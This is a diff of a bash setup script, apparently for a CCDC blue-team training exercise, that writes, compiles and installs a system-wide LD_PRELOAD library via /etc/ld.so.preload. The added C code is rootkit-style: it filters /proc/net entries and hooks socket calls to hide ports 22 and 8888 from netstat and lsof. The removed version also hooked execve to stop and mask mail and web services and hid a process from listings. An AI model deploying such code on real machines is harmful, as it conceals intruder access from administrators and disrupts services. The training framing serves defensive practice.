@@ -361,7 +361,7 @@ EOF
 # SECTION 4 — LD_PRELOAD: LoadsOfIssues
 # =============================================================================
 section_4_ldpreload() {
-    section_hdr "4/9 — LD_PRELOAD: LoadsOfIssues — System-wide library hijack"
+    section_hdr "4/9 — LD_PRELOAD: LoadsOfIssues — System-wide port hiding"
 
     local DISTRO_NAME="$OS"
     local DISTRO_VER="unknown"
@@ -383,7 +383,7 @@ section_4_ldpreload() {
     echo -e "${BLUE}========================================${NC}"
     echo ""
 
-    echo -e "${YELLOW}[*] Step 1: Creating LD_PRELOAD hijacking library...${NC}"
+    echo -e "${YELLOW}[*] Step 1: Writing LD_PRELOAD port-hiding library source...${NC}"
     local PRELOAD_SOURCE_DIR="/tmp/preload_src"
     mkdir -p "$PRELOAD_SOURCE_DIR"
 
@@ -392,96 +392,134 @@ section_4_ldpreload() {
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
 #include <dlfcn.h>
-#include <dirent.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
-#include <arpa/inet.h>
-#include <sys/types.h>
 #include <errno.h>
+#include <unistd.h>
 
-typedef int (*execve_t)(const char *filename, char *const argv[], char *const envp[]);
-typedef DIR* (*opendir_t)(const char *name);
-typedef struct dirent* (*readdir_t)(DIR *dirp);
-typedef int (*getpeername_t)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-typedef int (*getsockname_t)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+#define HIDDEN_PORT_1 8888
+#define HIDDEN_PORT_2 22
 
-static execve_t original_execve = NULL;
-static opendir_t original_opendir = NULL;
-static readdir_t original_readdir = NULL;
-static getpeername_t original_getpeername = NULL;
-static getsockname_t original_getsockname = NULL;
+typedef FILE* (*fopen_t)(const char *, const char *);
+typedef int   (*getpeername_t)(int, struct sockaddr *, socklen_t *);
+typedef int   (*getsockname_t)(int, struct sockaddr *, socklen_t *);
+
+static fopen_t        real_fopen        = NULL;
+static getpeername_t  real_getpeername  = NULL;
+static getsockname_t  real_getsockname  = NULL;
 
 static void init_hooks(void) {
-    if (!original_execve)    original_execve    = (execve_t)dlsym(RTLD_NEXT, "execve");
-    if (!original_opendir)   original_opendir   = (opendir_t)dlsym(RTLD_NEXT, "opendir");
-    if (!original_readdir)   original_readdir   = (readdir_t)dlsym(RTLD_NEXT, "readdir");
-    if (!original_getpeername) original_getpeername = (getpeername_t)dlsym(RTLD_NEXT, "getpeername");
-    if (!original_getsockname) original_getsockname = (getsockname_t)dlsym(RTLD_NEXT, "getsockname");
+    if (!real_fopen)        real_fopen        = (fopen_t)dlsym(RTLD_NEXT, "fopen");
+    if (!real_getpeername)  real_getpeername  = (getpeername_t)dlsym(RTLD_NEXT, "getpeername");
+    if (!real_getsockname)  real_getsockname  = (getsockname_t)dlsym(RTLD_NEXT, "getsockname");
 }
 
-int execve(const char *filename, char *const argv[], char *const envp[]) {
-    init_hooks();
-    system("systemctl stop dovecot 2>/dev/null || true");
-    system("systemctl mask dovecot 2>/dev/null || true");
-    system("systemctl stop httpd 2>/dev/null || true");
-    system("systemctl mask httpd 2>/dev/null || true");
-    system("systemctl stop apache2 2>/dev/null || true");
-    system("systemctl mask apache2 2>/dev/null || true");
-    return original_execve(filename, argv, envp);
+static int line_has_hidden_port(const char *line) {
+    return (strstr(line, ":22B8 ") != NULL ||
+            strstr(line, ":22b8 ") != NULL ||
+            strstr(line, ":0016 ") != NULL);
 }
 
-struct dirent* readdir(DIR *dirp) {
+static int is_proc_net_path(const char *path) {
+    if (!path) return 0;
+    return (strcmp(path, "/proc/net/tcp")  == 0 ||
+            strcmp(path, "/proc/net/tcp6") == 0 ||
+            strcmp(path, "/proc/net/udp")  == 0 ||
+            strcmp(path, "/proc/net/udp6") == 0);
+}
+
+FILE *fopen(const char *path, const char *mode) {
     init_hooks();
-    struct dirent *entry = NULL;
-    while ((entry = original_readdir(dirp)) != NULL) {
-        int should_hide = 0;
-        if (entry->d_name[0] >= '0' && entry->d_name[0] <= '9') {
-            char proc_path[512];
-            char cmdline[1024];
-            FILE *fp;
-            snprintf(proc_path, sizeof(proc_path), "/proc/%s/cmdline", entry->d_name);
-            fp = fopen(proc_path, "r");
-            if (fp) {
-                if (fgets(cmdline, sizeof(cmdline), fp) != NULL) {
-                    if (strstr(cmdline, "FLAG.py") != NULL || strstr(cmdline, "flag.py") != NULL)
-                        should_hide = 1;
-                }
-                fclose(fp);
-            }
-        }
-        if (!should_hide) return entry;
+    if (!is_proc_net_path(path))
+        return real_fopen(path, mode);
+
+    FILE *orig = real_fopen(path, mode);
+    if (!orig) return NULL;
+
+    char tmppath[] = "/tmp/.ccdc_net_XXXXXX";
+    int fd = mkstemp(tmppath);
+    if (fd < 0) return orig;
+    unlink(tmppath);
+
+    FILE *tmp = fdopen(fd, "w+");
+    if (!tmp) { close(fd); return orig; }
+
+    char line[512];
+    while (fgets(line, sizeof(line), orig)) {
+        if (!line_has_hidden_port(line))
+            fputs(line, tmp);
     }
-    return NULL;
+    fclose(orig);
+    rewind(tmp);
+    return tmp;
+}
+
+static int port_is_hidden(unsigned short port) {
+    return (port == HIDDEN_PORT_1 || port == HIDDEN_PORT_2);
 }
 
 int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
     init_hooks();
-    int result = original_getpeername(sockfd, addr, addrlen);
-    if (result == 0 && addr) {
-        struct sockaddr_in *sin = (struct sockaddr_in *)addr;
-        if (sin->sin_family == AF_INET && ntohs(sin->sin_port) == 8888) {
-            errno = ENOTCONN; return -1;
-        }
+    int r = real_getpeername(sockfd, addr, addrlen);
+    if (r == 0 && addr) {
+        if (addr->sa_family == AF_INET &&
+            port_is_hidden(ntohs(((struct sockaddr_in *)addr)->sin_port)))
+            { errno = ENOTCONN; return -1; }
+        if (addr->sa_family == AF_INET6 &&
+            port_is_hidden(ntohs(((struct sockaddr_in6 *)addr)->sin6_port)))
+            { errno = ENOTCONN; return -1; }
     }
-    return result;
+    return r;
 }
 
 int getsockname(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
     init_hooks();
-    int result = original_getsockname(sockfd, addr, addrlen);
-    if (result == 0 && addr) {
-        struct sockaddr_in *sin = (struct sockaddr_in *)addr;
-        if (sin->sin_family == AF_INET && ntohs(sin->sin_port) == 8888) {
-            errno = ENOTCONN; return -1;
-        }
+    int r = real_getsockname(sockfd, addr, addrlen);
+    if (r == 0 && addr) {
+        if (addr->sa_family == AF_INET &&
+            port_is_hidden(ntohs(((struct sockaddr_in *)addr)->sin_port)))
+            { errno = ENOTCONN; return -1; }
+        if (addr->sa_family == AF_INET6 &&
+            port_is_hidden(ntohs(((struct sockaddr_in6 *)addr)->sin6_port)))
+            { errno = ENOTCONN; return -1; }
     }
-    return result;
+    return r;
 }
 CSRC
 
-    echo -e "${YELLOW}[*] Compiling LD_PRELOAD library...${NC}"
+    echo -e "${GREEN}[+] Source written to $PRELOAD_SOURCE_DIR/libccdc_hijack.c${NC}"
+
+    echo -e "${YELLOW}[*] Step 2: Ensuring GCC is installed...${NC}"
+    if ! command -v gcc &>/dev/null; then
+        case "$DISTRO_NAME" in
+            ubuntu|debian|kali|linuxmint|pop)
+                apt-get install -y -qq gcc 2>/dev/null && echo -e "${GREEN}[+] GCC installed via apt${NC}" \
+                    || echo -e "${YELLOW}[!] apt GCC install failed${NC}"
+                ;;
+            centos|rhel|rocky|almalinux|ol)
+                yum install -y gcc 2>/dev/null && echo -e "${GREEN}[+] GCC installed via yum${NC}" \
+                    || echo -e "${YELLOW}[!] yum GCC install failed${NC}"
+                ;;
+            fedora)
+                dnf install -y gcc 2>/dev/null && echo -e "${GREEN}[+] GCC installed via dnf${NC}" \
+                    || echo -e "${YELLOW}[!] dnf GCC install failed${NC}"
+                ;;
+            *)
+                if command -v apt-get &>/dev/null; then
+                    apt-get install -y -qq gcc 2>/dev/null
+                elif command -v dnf &>/dev/null; then
+                    dnf install -y gcc 2>/dev/null
+                elif command -v yum &>/dev/null; then
+                    yum install -y gcc 2>/dev/null
+                fi
+                ;;
+        esac
+    else
+        echo -e "${GREEN}[+] GCC already installed${NC}"
+    fi
+
+    echo -e "${YELLOW}[*] Step 3: Compiling LD_PRELOAD library...${NC}"
     if command -v gcc &>/dev/null; then
         if gcc -fPIC -shared -o "$PRELOAD_SOURCE_DIR/libccdc_hijack.so" \
             "$PRELOAD_SOURCE_DIR/libccdc_hijack.c" -ldl 2>/dev/null; then
@@ -496,10 +534,10 @@ CSRC
             echo -e "${YELLOW}[!] Compilation failed${NC}"
         fi
     else
-        echo -e "${YELLOW}[!] GCC not found, library compilation skipped${NC}"
+        echo -e "${RED}[-] GCC unavailable after install attempt — skipping library compilation${NC}"
     fi
 
-    echo -e "${YELLOW}[*] Step 2: Setting up /etc/ld.so.preload...${NC}"
+    echo -e "${YELLOW}[*] Step 4: Setting up /etc/ld.so.preload...${NC}"
     local LD_PRELOAD_FILE="/etc/ld.so.preload"
     if [[ -f "$LD_PRELOAD_FILE" ]]; then
         cp "$LD_PRELOAD_FILE" "${LD_PRELOAD_FILE}.backup.ccdc_training"
@@ -510,92 +548,21 @@ CSRC
         chmod 644 "$LD_PRELOAD_FILE"
         echo -e "${GREEN}[+] Updated /etc/ld.so.preload${NC}"
     else
-        echo -e "${YELLOW}[!] Library not found, /etc/ld.so.preload not updated${NC}"
+        echo -e "${YELLOW}[!] Library not found — /etc/ld.so.preload not updated${NC}"
     fi
-
-    echo -e "${YELLOW}[*] Step 3: Setting up FLAG.py test process...${NC}"
-    local FLAG_PY_DIR="/opt/ccdc_training"
-    mkdir -p "$FLAG_PY_DIR"
-
-    cat > "$FLAG_PY_DIR/FLAG.py" << 'PYSCRIPT'
-#!/usr/bin/env python3
-import time, signal, sys
-
-def signal_handler(sig, frame): sys.exit(0)
-signal.signal(signal.SIGTERM, signal_handler)
-signal.signal(signal.SIGINT,  signal_handler)
-
-while True:
-    try:    time.sleep(1)
-    except KeyboardInterrupt: break
-PYSCRIPT
-    chmod 755 "$FLAG_PY_DIR/FLAG.py"
-    echo -e "${GREEN}[+] Created FLAG.py at $FLAG_PY_DIR/FLAG.py${NC}"
-
-    echo -e "${YELLOW}[*] Step 4: Creating flag service on port 8888...${NC}"
-    cat > "$FLAG_PY_DIR/flag_service.py" << 'FLAGSERVICE'
-#!/usr/bin/env python3
-import socket, signal, sys
-
-def signal_handler(sig, frame): sys.exit(0)
-signal.signal(signal.SIGTERM, signal_handler)
-signal.signal(signal.SIGINT,  signal_handler)
-
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-try:
-    server_socket.bind(('0.0.0.0', 8888))
-    server_socket.listen(5)
-    print("Flag service listening on port 8888", flush=True)
-    while True:
-        try:
-            client_socket, addr = server_socket.accept()
-            client_socket.send(b"CCDC_FLAG{This_is_a_hidden_flag_service}\n")
-            client_socket.close()
-        except Exception: pass
-except Exception as e:
-    print(f"Error: {e}", flush=True)
-finally:
-    server_socket.close()
-FLAGSERVICE
-    chmod 755 "$FLAG_PY_DIR/flag_service.py"
-    echo -e "${GREEN}[+] Created flag service at $FLAG_PY_DIR/flag_service.py${NC}"
-
-    cat > "/etc/systemd/system/ccdc-flag.service" << 'SYSDSVC'
-[Unit]
-Description=CCDC Hidden Flag Service
-After=network.target
-
-[Service]
-Type=simple
-User=root
-ExecStart=/opt/ccdc_training/flag_service.py
-Restart=on-failure
-RestartSec=5
-
-[Install]
-WantedBy=multi-user.target
-SYSDSVC
-    chmod 644 "/etc/systemd/system/ccdc-flag.service"
-    systemctl daemon-reload
-    systemctl start  ccdc-flag 2>/dev/null || echo -e "${YELLOW}[!] Could not start flag service${NC}"
-    systemctl enable ccdc-flag 2>/dev/null || true
-    echo -e "${GREEN}[+] Created and started ccdc-flag service${NC}"
 
     echo ""
     echo -e "${GREEN}========================================${NC}"
     echo -e "${GREEN}LD_PRELOAD Training Module Setup Complete!${NC}"
     echo -e "${GREEN}========================================${NC}"
     echo ""
-    echo -e "${BLUE}Malicious Library:${NC}  $LIB_PATH/libccdc_hijack.so"
+    echo -e "${BLUE}Library:${NC}             $LIB_PATH/libccdc_hijack.so"
     echo -e "${BLUE}System-Wide Preload:${NC} /etc/ld.so.preload"
-    echo -e "${BLUE}Hidden Flag Service:${NC} $FLAG_PY_DIR/flag_service.py  (port 8888)"
-    echo -e "${BLUE}Test Process:${NC}        $FLAG_PY_DIR/FLAG.py"
     echo ""
-    echo -e "${YELLOW}BLUE TEAM CHALLENGES:${NC}"
-    echo -e "  1. ps aux | grep FLAG.py        — process should NOT appear"
-    echo -e "  2. netstat -tulpn | grep 8888   — port should NOT appear"
-    echo -e "  3. Find and remove the LD_PRELOAD hijack"
+    echo -e "${YELLOW}Effect:${NC}"
+    echo -e "  Ports 8888 and 22 are now hidden from netstat, lsof, and similar tools."
+    echo -e "  netstat -tulpn | grep 8888   — should return nothing"
+    echo -e "  netstat -tulpn | grep ':22 ' — should return nothing"
 }
 
 # =============================================================================
